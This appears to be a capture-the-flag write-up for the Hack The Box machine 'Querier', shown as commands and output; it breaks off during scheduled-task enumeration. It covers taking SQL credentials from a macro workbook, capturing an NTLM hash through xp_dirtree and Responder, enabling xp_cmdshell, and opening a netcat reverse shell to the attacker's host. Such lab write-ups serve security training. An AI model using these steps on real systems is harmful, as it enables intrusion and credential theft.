# Querier

```bash
nmap -p- -iL target -v -oN nmap/fps.txt
```

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
```

```bash
ports=awk -F '/' 'NR>=6 && NR<=18 {print $1}' nmap/fps.txt | paste -sd ','
nmap -p$ports -iL target -v -A -oN nmap/tcp_ports.txt -oX nmap/tcp_ports.xml
```

```
PORT      STATE SERVICE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.125:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-14T15:25:35
| Not valid after:  2055-04-14T15:25:35
| MD5:   e6d5:cf74:a311:d8fb:c529:491e:aa4a:e32d
|_SHA-1: 1001:000b:e6fe:6936:8f2b:d86c:22df:82a3:be7d:864b
|_ssl-date: 2025-04-14T15:31:59+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows 2019|2012|2022|10|2016|2008|7|Vista|Longhorn (95%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_10:1511 cpe:/o:microsoft:windows_vista::sp1:home_premium cpe:/o:microsoft:windows
Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows 10 1909 (92%), Microsoft Windows 10 1709 - 1909 (87%), Microsoft Windows Server 2012 (87%), Microsoft Windows Server 2012 or Server 2012 R2 (87%), Microsoft Windows Server 2016 (87%), Microsoft Windows 10 1703 (86%), Microsoft Windows Server 2008 R2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-14T15:31:54
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

## SMB

```bash
smbclient -L //10.10.10.125
```

```
Password for [WORKGROUP\root]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```└─# sudo apt install libimage-exiftool-perl

Upgrading:                      
  libimage-exiftool-perl

Summary:
  Upgrading: 1, Installing: 0, Removing: 0, Not Upgrading: 2274
  Download size: 5633 kB
  Space needed: 3640 kB / 286 GB available

Get:1 http://http.kali.org/kali kali-rolling/main amd64 libimage-exiftool-perl all 13.10+dfsg-1 [5633 kB]
Fetched 5633 kB in 1s (7480 kB/s)           
(Reading database ... 473470 files and directories currently installed.)
Preparing to unpack .../libimage-exiftool-perl_13.10+dfsg-1_all.deb ...
Unpacking libimage-exiftool-perl (13.10+dfsg-1) over (12.76+dfsg-1) ...
Setting up libimage-exiftool-perl (13.10+dfsg-1) ...
Processing triggers for doc-base (0.11.2) ...
Processing 1 changed doc-base file...
Processing triggers for man-db (2.12.1-1) ...
Processing triggers for kali-menu (2023.4.7) ...
Scanning processes...                                                                                             
Scanning linux images...                                                                                          

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
                                                                                                                  
┌──(root㉿vb-kali)-[~/htb/machines/querier]
└─# exiftool Currency\ Volume\ Report.xlsm 
ExifTool Version Number         : 13.10
File Name                       : Currency Volume Report.xlsm
Directory                       : .
File Size                       : 12 kB
File Modification Date/Time     : 2025:04:19 09:27:34-04:00
File Access Date/Time           : 2025:04:19 09:31:40-04:00
File Inode Change Date/Time     : 2025:04:19 09:27:34-04:00
File Permissions                : -rw-r--r--
File Type                       : XLSM
File Type Extension             : xlsm
MIME Type                       : application/vnd.ms-excel.sheet.macroEnabled.12
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x513599ac
Zip Compressed Size             : 367
Zip Uncompressed Size           : 1087
Zip File Name                   : [Content_Types].xml
Creator                         : Luis
Last Modified By                : Luis
Create Date                     : 2019:01:21 20:38:56Z
Modify Date                     : 2019:01:27 22:21:34Z
Application                     : Microsoft Excel
Doc Security                    : None
Scale Crop                      : No
Heading Pairs                   : Worksheets, 1
Titles Of Parts                 : Currency Volume
Company                         : 
Links Up To Date                : No
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 16.0300
```

I have install olevba:

```bash
pipx install oletools
```

```bash
olevba Currency\ Volume\ Report.xlsm
```

This dump a SQL Connection string and I used to connect on SQL Server:

```bash
impacket-mssqlclient reporting@10.10.10.125 -windows-auth
xp_dirtree C:\\Users
```

Then I started responder:

```bash
responder -I tun0
```

In my mssql session I run again `xp_dirtree` again my fake SMB share:

```bash
exec xp_dirtree '//<YOUR IP>/fake_dir',1,0
```
![Screenshot from 2025-05-28 20-50-45](https://github.com/user-attachments/assets/5a6826e0-3012-48d8-b976-c4b1b52f4749)

I grab the hash with responder:

![Screenshot from 2025-05-28 20-51-08](https://github.com/user-attachments/assets/80fa2ad6-a039-49a9-8bef-e4dcaa3d83a6)

I save it on a file.
Then I crack it using hashcat:

![Screenshot from 2025-05-28 20-51-39](https://github.com/user-attachments/assets/62ae700a-4117-4922-932c-0057c7386713)

Then I run again mssql impacket tool:

```bash
impacket-mssqlclient mssql-svc@10.10.10.125 -windows-auth
```

I got elevated privilege, you can check it by running:

```bash
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Then I enable the `xp_cmdshell` and got the user flag:

```bash
enable_xp_cmdshell
exec xp_cmdshell 'more C:\Users\mssql-svc\Desktop\user.txt'
```

## Privile Escalation

```
output                                                                                                            
---------------------------------------------------------------------------------------------------------------   
NULL                                                                                                              

Host Name:                 QUERIER                                                                                

OS Name:                   Microsoft Windows Server 2019 Standard                                                 

OS Version:                10.0.17763 N/A Build 17763                                                             

OS Manufacturer:           Microsoft Corporation                                                                  

OS Configuration:          Member Server                                                                          

OS Build Type:             Multiprocessor Free                                                                    

Registered Owner:          Windows User                                                                           

Registered Organization:                                                                                          

Product ID:                00429-00521-62775-AA073                                                                

Original Install Date:     1/28/2019, 11:16:50 PM                                                                 

System Boot Time:          5/28/2025, 7:20:50 PM                                                                  

System Manufacturer:       VMware, Inc.                                                                           

System Model:              VMware7,1                                                                              

System Type:               x64-based PC                                                                           

Processor(s):              2 Processor(s) Installed.                                                              

                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz                        

                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2595 Mhz                        

BIOS Version:              VMware, Inc. VMW71.00V.24224532.B64.2408191458, 8/19/2024                              

Windows Directory:         C:\Windows                                                                             

System Directory:          C:\Windows\system32                                                                    

Boot Device:               \Device\HarddiskVolume2                                                                

System Locale:             en-us;English (United States)                                                          

Input Locale:              en-us;English (United States)                                                          

Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London                                          

Total Physical Memory:     4,095 MB                                                                               

Available Physical Memory: 2,936 MB                                                                               

Virtual Memory: Max Size:  5,503 MB                                                                               

Virtual Memory: Available: 4,255 MB                                                                               

Virtual Memory: In Use:    1,248 MB                                                                               

Page File Location(s):     C:\pagefile.sys                                                                        

Domain:                    HTB.LOCAL                                                                              

Logon Server:              N/A                                                                                    

Hotfix(s):                 5 Hotfix(s) Installed.                                                                 

                           [01]: KB4481031                                                                        

                           [02]: KB4470788                                                                        

                           [03]: KB4480056                                                                        

                           [04]: KB4480979                                                                        

                           [05]: KB4476976                                                                        

Network Card(s):           1 NIC(s) Installed.                                                                    

                           [01]: vmxnet3 Ethernet Adapter                                                         

                                 Connection Name: Ethernet0 2                                                     

                                 DHCP Enabled:    No                                                              

                                 IP address(es)                                                                   

                                 [01]: 10.10.10.125                                                               

                                 [02]: fe80::3c06:b7cf:4ce5:742                                                   

                                 [03]: dead:beef::3c06:b7cf:4ce5:742                                              

                                 [04]: dead:beef::23d                                                             

Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.   

NULL
```

The first step was to change the shell. I copied a netcat executable in my local folder and the start a SMB server:

```bash
cp /usr/share/windows-resources/binaries/nc.exe .
impacket-smbserver -ip <YOUR IP> share . -smb2support
```

Then, from the remote machine, I copied the file:

```cmd
exec xp_cmdshell 'copy \\<YOUR IP>\share\nc.exe %TEMP%'
```

On my machine I started a netcat server listening on the port 7474:

```bash
nc -lvnp 7474
```

And then I run the netcat client and I got a new shell:

```bash
exec xp_cmdshell 'start %TEMP%\nc.exe -e cmd <YOUR IP> 7474'
```

```
C:\Windows\System32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

C:\Windows\System32>whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID                                                             Attributes                                        
==================================== ================ =============================================================== ==================================================
Everyone                             Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Monitor Users    Alias            S-1-5-32-558                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113                                                       Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQLSERVER               Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner    
LOCAL                                Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10                                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

```
C:\Windows\System32>net localgroup
net localgroup

Aliases for \\QUERIER

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*SQLServer2005SQLBrowserUser$QUERIER
*Storage Replica Administrators
*System Managed Accounts Group
*Users
The command completed successfully.
```

```
net start
These Windows services are started:

   Background Tasks Infrastructure Service
   Base Filtering Engine
   CNG Key Isolation
   COM+ Event System
   COM+ System Application
   Connected Devices Platform Service
   Connected User Experiences and Telemetry
   CoreMessaging
   Cryptographic Services
   DCOM Server Process Launcher
   Device Setup Manager
   DHCP Client
   Diagnostic Policy Service
   Distributed Link Tracking Client
   Distributed Transaction Coordinator
   DNS Client
   Group Policy Client
   IKE and AuthIP IPsec Keying Modules
   IP Helper
   IPsec Policy Agent
   Local Session Manager
   Netlogon
   Network Connection Broker
   Network List Service
   Network Location Awareness
   Network Store Interface Service
   Plug and Play
   Power
   Print Spooler
   Remote Access Connection Manager
   Remote Procedure Call (RPC)
   RPC Endpoint Mapper
   Secure Socket Tunneling Protocol Service
   Security Accounts Manager
   Server
   Shell Hardware Detection
   SQL Server (MSSQLSERVER)
   SQL Server Agent (MSSQLSERVER)
   SQL Server CEIP service (MSSQLSERVER)
   SQL Server VSS Writer
   State Repository Service
   SysMain
   System Event Notification Service
   System Events Broker
   Task Scheduler
   TCP/IP NetBIOS Helper
   Themes
   Time Broker
   Update Orchestrator Service
   User Access Logging Service
   User Manager
   User Profile Service
   VMware Alias Manager and Ticket Service
   VMware Physical Disk Helper Service
   VMware Tools
   Windows Connection Manager
   Windows Defender Antivirus Network Inspection Service
   Windows Defender Antivirus Service
   Windows Defender Firewall
   Windows Event Log
   Windows Font Cache Service
   Windows License Manager Service
   Windows Management Instrumentation
   Windows Push Notifications System Service
   Windows Remote Management (WS-Management)
   Windows Security Service
   Windows Time
   WinHTTP Web Proxy Auto-Discovery Service
   Workstation

The command completed successfully.
```

```
C:\Windows\System32>wmic service list brief
wmic service list brief
ExitCode  Name                                      ProcessId  StartMode  State    Status   
1077      AJRouter                                  0          Manual     Stopped  OK       
1077      ALG                                       0          Manual     Stopped  OK       
1077      AppIDSvc                                  0          Manual     Stopped  OK       
1077      Appinfo                                   0          Manual     Stopped  OK       
1077      AppMgmt                                   0          Manual     Stopped  OK       
1077      AppReadiness                              0          Manual     Stopped  OK       
1077      AppVClient                                0          Disabled   Stopped  OK       
0         AppXSvc                                   0          Manual     Stopped  OK       
1077      AudioEndpointBuilder                      0          Manual     Stopped  OK       
1077      Audiosrv                                  0          Manual     Stopped  OK       
1077      AxInstSV                                  0          Disabled   Stopped  OK       
0         BFE                                       1392       Auto       Running  OK       
1077      BITS                                      0          Disabled   Stopped  OK       
0         BrokerInfrastructure                      732        Auto       Running  OK       
1077      BTAGService                               0          Manual     Stopped  OK       
1077      BthAvctpSvc                               0          Manual     Stopped  OK       
1077      bthserv                                   0          Manual     Stopped  OK       
0         camsvc                                    0          Manual     Stopped  OK       
0         CDPSvc                                    1152       Auto       Running  OK       
1077      CertPropSvc                               0          Manual     Stopped  OK       
0         ClipSVC                                   0          Manual     Stopped  OK       
0         COMSysApp                                 3648       Manual     Running  OK       
0         CoreMessagingRegistrar                    1100       Auto       Running  OK       
0         CryptSvc                                  2704       Auto       Running  OK       
1077      CscService                                0          Disabled   Stopped  OK       
0         DcomLaunch                                732        Auto       Running  OK       
1077      defragsvc                                 0          Manual     Stopped  OK       
1077      DeviceAssociationService                  0          Manual     Stopped  OK       
0         DeviceInstall                             0          Manual     Stopped  OK       
1077      DevQueryBroker                            0          Manual     Stopped  OK       
0         Dhcp                                      1276       Auto       Running  OK       
1077      diagnosticshub.standardcollector.service  0          Manual     Stopped  OK       
0         DiagTrack                                 2712       Auto       Running  OK       
1077      DmEnrollmentSvc                           0          Manual     Stopped  OK       
1077      dmwappushservice                          0          Disabled   Stopped  OK       
0         Dnscache                                  1068       Auto       Running  OK       
0         DoSvc                                     0          Manual     Stopped  OK       
1077      dot3svc                                   0          Manual     Stopped  OK       
0         DPS                                       940        Auto       Running  OK       
0         DsmSvc                                    1000       Manual     Running  OK       
1077      DsSvc                                     0          Manual     Stopped  OK       
1077      Eaphost                                   0          Manual     Stopped  OK       
1077      EFS                                       0          Manual     Stopped  OK       
1077      embeddedmode                              0          Manual     Stopped  OK       
1077      EntAppSvc                                 0          Manual     Stopped  OK       
0         EventLog                                  1088       Auto       Running  OK       
0         EventSystem                               1576       Auto       Running  OK       
1077      fdPHost                                   0          Manual     Stopped  OK       
1077      FDResPub                                  0          Manual     Stopped  OK       
0         FontCache                                 1456       Auto       Running  OK       
1077      FrameServer                               0          Manual     Stopped  OK       
0         gpsvc                                     1344       Auto       Running  OK       
1077      GraphicsPerfSvc                           0          Disabled   Stopped  OK       
1077      hidserv                                   0          Manual     Stopped  OK       
1077      HvHost                                    0          Manual     Stopped  OK       
1077      icssvc                                    0          Disabled   Stopped  OK       
0         IKEEXT                                    1916       Auto       Running  OK       
1077      InstallService                            0          Manual     Stopped  OK       
0         iphlpsvc                                  2128       Auto       Running  OK       
0         KeyIso                                    608        Manual     Running  OK       
1077      KPSSVC                                    0          Manual     Stopped  OK       
1077      KtmRm                                     0          Manual     Stopped  OK       
0         LanmanServer                              2800       Auto       Running  OK       
0         LanmanWorkstation                         2172       Auto       Running  OK       
1077      lfsvc                                     0          Disabled   Stopped  OK       
0         LicenseManager                            4876       Manual     Running  OK       
1077      lltdsvc                                   0          Disabled   Stopped  OK       
0         lmhosts                                   320        Manual     Running  OK       
0         LSM                                       888        Unknown    Running  UNKNOWN  
1077      MapsBroker                                0          Disabled   Stopped  OK       
0         mpssvc                                    1392       Auto       Running  OK       
0         MSDTC                                     3820       Auto       Running  OK       
1077      MSiSCSI                                   0          Manual     Stopped  OK       
1077      msiserver                                 0          Manual     Stopped  OK       
0         MSSQLSERVER                               4288       Auto       Running  OK       
0         NcaSvc                                    0          Manual     Stopped  OK       
0         NcbService                                376        Manual     Running  OK       
0         Netlogon                                  608        Auto       Running  OK       
1077      Netman                                    0          Manual     Stopped  OK       
0         netprofm                                  1556       Manual     Running  OK       
0         NetSetupSvc                               0          Unknown    Stopped  UNKNOWN  
1077      NetTcpPortSharing                         0          Disabled   Stopped  OK       
1077      NgcCtnrSvc                                0          Manual     Stopped  OK       
1077      NgcSvc                                    0          Manual     Stopped  OK       
0         NlaSvc                                    1400       Auto       Running  OK       
0         nsi                                       696        Auto       Running  OK       
1077      PcaSvc                                    0          Manual     Stopped  OK       
1077      PerfHost                                  0          Manual     Stopped  OK       
1077      PhoneSvc                                  0          Disabled   Stopped  OK       
1077      pla                                       0          Manual     Stopped  OK       
0         PlugPlay                                  712        Manual     Running  OK       
0         PolicyAgent                               1932       Manual     Running  OK       
0         Power                                     732        Auto       Running  OK       
1077      PrintNotify                               0          Manual     Stopped  OK       
0         ProfSvc                                   1548       Auto       Running  OK       
1077      PushToInstall                             0          Disabled   Stopped  OK       
1077      RasAuto                                   0          Manual     Stopped  OK       
0         RasMan                                    3052       Auto       Running  OK       
1077      RemoteAccess                              0          Disabled   Stopped  OK       
0         RemoteRegistry                            0          Auto       Stopped  OK       
1077      RmSvc                                     0          Disabled   Stopped  OK       
0         RpcEptMapper                              840        Auto       Running  OK       
1077      RpcLocator                                0          Manual     Stopped  OK       
0         RpcSs                                     840        Auto       Running  OK       
1077      RSoPProv                                  0          Manual     Stopped  OK       
1077      sacsvr                                    0          Manual     Stopped  OK       
0         SamSs                                     608        Auto       Running  OK       
1077      SCardSvr                                  0          Manual     Stopped  OK       
1077      ScDeviceEnum                              0          Disabled   Stopped  OK       
0         Schedule                                  1464       Auto       Running  OK       
1077      SCPolicySvc                               0          Manual     Stopped  OK       
1077      seclogon                                  0          Manual     Stopped  OK       
0         SecurityHealthService                     3356       Manual     Running  OK       
1077      SEMgrSvc                                  0          Disabled   Stopped  OK       
0         SENS                                      1752       Auto       Running  OK       
1077      Sense                                     0          Manual     Stopped  OK       
1077      SensorDataService                         0          Disabled   Stopped  OK       
1077      SensorService                             0          Manual     Stopped  OK       
1077      SensrSvc                                  0          Manual     Stopped  OK       
1077      SessionEnv                                0          Manual     Stopped  OK       
1077      SgrmBroker                                0          Manual     Stopped  OK       
1077      SharedAccess                              0          Disabled   Stopped  OK       
0         ShellHWDetection                          1952       Auto       Running  OK       
1077      shpamsvc                                  0          Disabled   Stopped  OK       
1077      smphost                                   0          Manual     Stopped  OK       
1077      SNMPTRAP                                  0          Manual     Stopped  OK       
0         Spooler                                   2668       Auto       Running  OK       
0         sppsvc                                    0          Auto       Stopped  OK       
1077      SQLBrowser                                0          Disabled   Stopped  OK       
0         SQLSERVERAGENT                            4980       Auto       Running  OK       
0         SQLTELEMETRY                              4296       Auto       Running  OK       
0         SQLWriter                                 2900       Auto       Running  OK       
1077      ssh-agent                                 0          Disabled   Stopped  OK       
0         SstpSvc                                   2752       Manual     Running  OK       
0         StateRepository                           2772       Manual     Running  OK       
1077      stisvc                                    0          Manual     Stopped  OK       
1077      StorSvc                                   0          Manual     Stopped  OK       
1077      svsvc                                     0          Manual     Stopped  OK       
1077      swprv                                     0          Manual     Stopped  OK       
0         SysMain                                   2848       Auto       Running  OK       
0         SystemEventsBroker                        732        Auto       Running  OK       
1077      TabletInputService                        0          Manual     Stopped  OK       
1077      tapisrv                                   0          Manual     Stopped  OK       
1077      TermService                               0          Manual     Stopped  OK       
0         Themes                                    1592       Auto       Running  OK       
1077      TieringEngineService                      0          Manual     Stopped  OK       
0         TimeBrokerSvc                             652        Manual     Running  OK       
1077      TokenBroker                               0          Manual     Stopped  OK       
0         TrkWks                                    2856       Auto       Running  OK       
0         TrustedInstaller                          0          Manual     Stopped  OK       
1077      tzautoupdate                              0          Disabled   Stopped  OK       
0         UALSVC                                    1140       Auto       Running  OK       
1077      UevAgentService                           0          Disabled   Stopped  OK       
1077      UmRdpService                              0          Manual     Stopped  OK       
0         UserManager                               2080       Auto       Running  OK       
0         UsoSvc                                    1896       Auto       Running  OK       
1077      VaultSvc                                  0          Manual     Stopped  OK       
1077      vds                                       0          Manual     Stopped  OK       
0         VGAuthService                             2940       Auto       Running  OK       
1077      vmicguestinterface                        0          Manual     Stopped  OK       
1077      vmicheartbeat                             0          Manual     Stopped  OK       
1077      vmickvpexchange                           0          Manual     Stopped  OK       
1077      vmicrdv                                   0          Manual     Stopped  OK       
1077      vmicshutdown                              0          Manual     Stopped  OK       
1077      vmictimesync                              0          Manual     Stopped  OK       
1077      vmicvmsession                             0          Manual     Stopped  OK       
1077      vmicvss                                   0          Manual     Stopped  OK       
0         VMTools                                   2908       Auto       Running  OK       
0         vmvss                                     0          Manual     Stopped  OK       
0         VMware Physical Disk Helper Service       1380       Auto       Running  OK       
1077      VMwareCAFCommAmqpListener                 0          Manual     Stopped  OK       
1077      VMwareCAFManagementAgentHost              0          Manual     Stopped  OK       
0         VSS                                       0          Manual     Stopped  OK       
0         W32Time                                   336        Auto       Running  OK       
0         WaaSMedicSvc                              0          Manual     Stopped  OK       
1077      WalletService                             0          Disabled   Stopped  OK       
1077      WarpJITSvc                                0          Manual     Stopped  OK       
1077      WbioSrvc                                  0          Manual     Stopped  OK       
0         Wcmsvc                                    1828       Auto       Running  OK       
1077      WdiServiceHost                            0          Manual     Stopped  OK       
1077      WdiSystemHost                             0          Manual     Stopped  OK       
0         WdNisSvc                                  4052       Manual     Running  OK       
1077      Wecsvc                                    0          Manual     Stopped  OK       
1077      WEPHOSTSVC                                0          Manual     Stopped  OK       
1077      wercplsupport                             0          Manual     Stopped  OK       
1077      WerSvc                                    0          Manual     Stopped  OK       
1077      WiaRpc                                    0          Manual     Stopped  OK       
0         WinDefend                                 2960       Auto       Running  OK       
0         WinHttpAutoProxySvc                       1924       Manual     Running  OK       
0         Winmgmt                                   1040       Auto       Running  OK       
0         WinRM                                     2932       Auto       Running  OK       
1077      wisvc                                     0          Disabled   Stopped  OK       
0         wlidsvc                                   0          Manual     Stopped  OK       
0         wmiApSrv                                  0          Manual     Stopped  OK       
1077      WMPNetworkSvc                             0          Manual     Stopped  OK       
0         WPDBusEnum                                0          Manual     Stopped  OK       
0         WpnService                                2924       Auto       Running  OK       
1077      WSearch                                   0          Disabled   Stopped  OK       
1077      wuauserv                                  0          Disabled   Stopped  OK       


```

```
C:\Windows\System32>tasklist /SVC
tasklist /SVC

Image Name                     PID Services                                    
========================= ======== ============================================
System Idle Process              0 N/A                                         
System                           4 N/A                                         
Registry                        88 N/A                                         
smss.exe                       268 N/A                                         
csrss.exe                      372 N/A                                         
wininit.exe                    448 N/A                                         
csrss.exe                      456 N/A                                         
winlogon.exe                   512 N/A                                         
services.exe                   588 N/A                                         
lsass.exe                      608 KeyIso, Netlogon, SamSs                     
svchost.exe                    712 PlugPlay                                    
svchost.exe                    732 BrokerInfrastructure, DcomLaunch, Power,    
                                   SystemEventsBroker                          
fontdrvhost.exe                756 N/A                                         
fontdrvhost.exe                764 N/A                                         
svchost.exe                    840 RpcEptMapper, RpcSs                         
svchost.exe                    888 LSM                                         
dwm.exe                        932 N/A                                         
svchost.exe                   1000 DsmSvc                                      
svchost.exe                    376 NcbService                                  
svchost.exe                    320 lmhosts                                     
svchost.exe                    336 W32Time                                     
svchost.exe                    696 nsi                                         
svchost.exe                    652 TimeBrokerSvc                               
svchost.exe                   1068 Dnscache                                    
svchost.exe                   1088 EventLog                                    
svchost.exe                   1100 CoreMessagingRegistrar                      
svchost.exe                   1276 Dhcp                                        
svchost.exe                   1344 gpsvc                                       
vmacthlp.exe                  1380 VMware Physical Disk Helper Service         
svchost.exe                   1392 BFE, mpssvc                                 
svchost.exe                   1400 NlaSvc                                      
svchost.exe                   1464 Schedule                                    
svchost.exe                   1548 ProfSvc                                     
svchost.exe                   1556 netprofm                                    
svchost.exe                   1576 EventSystem                                 
svchost.exe                   1592 Themes                                      
svchost.exe                   1752 SENS                                        
svchost.exe                   1828 Wcmsvc                                      
svchost.exe                   1916 IKEEXT                                      
svchost.exe                   1924 WinHttpAutoProxySvc                         
svchost.exe                   1932 PolicyAgent                                 
svchost.exe                   1952 ShellHWDetection                            
svchost.exe                   1040 Winmgmt                                     
svchost.exe                   1456 FontCache                                   
svchost.exe                   2080 UserManager                                 
svchost.exe                   2128 iphlpsvc                                    
svchost.exe                   2172 LanmanWorkstation                           
spoolsv.exe                   2668 Spooler                                     
svchost.exe                   2704 CryptSvc                                    
svchost.exe                   2712 DiagTrack                                   
svchost.exe                   2752 SstpSvc                                     
svchost.exe                   2800 LanmanServer                                
svchost.exe                   2848 SysMain                                     
svchost.exe                   2856 TrkWks                                      
sqlwriter.exe                 2900 SQLWriter                                   
vmtoolsd.exe                  2908 VMTools                                     
svchost.exe                   2924 WpnService                                  
svchost.exe                   2932 WinRM                                       
VGAuthService.exe             2940 VGAuthService                               
MsMpEng.exe                   2960 WinDefend                                   
svchost.exe                   3052 RasMan                                      
dllhost.exe                   3648 COMSysApp                                   
WmiPrvSE.exe                  3656 N/A                                         
msdtc.exe                     3820 MSDTC                                       
NisSrv.exe                    4052 WdNisSvc                                    
sqlservr.exe                  4288 MSSQLSERVER                                 
sqlceip.exe                   4296 SQLTELEMETRY                                
svchost.exe                   4876 LicenseManager                              
SQLAGENT.EXE                  4980 SQLSERVERAGENT                              
conhost.exe                   5008 N/A                                         
LogonUI.exe                   4120 N/A                                         
svchost.exe                    940 DPS                                         
svchost.exe                   1140 UALSVC                                      
svchost.exe                   1896 UsoSvc                                      
svchost.exe                   1152 CDPSvc                                      
cmd.exe                       5100 N/A                                         
conhost.exe                   4384 N/A                                         
svchost.exe                   2772 StateRepository                             
SecurityHealthService.exe     3356 SecurityHealthService                       
nc.exe                        1900 N/A                                         
conhost.exe                   5048 N/A                                         
cmd.exe                       5024 N/A                                         
WmiPrvSE.exe                  4784 N/A                                         
tasklist.exe                  1840 N/A
```

```
chtasks /query /fo LIST
schtasks /query /fo LIST

Folder: \
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Windows
HostName:      QUERIER
TaskName:      \Microsoft\Windows\Server Initial Configuration Task
Next Run Time: N/A
Status:        Disabled
Logon Mode:    Interactive/Background

Folder: \Microsoft\Windows\.NET Framework
HostName:      QUERIER
TaskName:      \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319
Next Run Time: N/A
Status:        Queued
Logon Mode:    Interactive/Background

HostName:      QUERIER
TaskName:      \Microsoft\Windows\.NET Framework\.NET Framework NGEN v4.0.30319 64
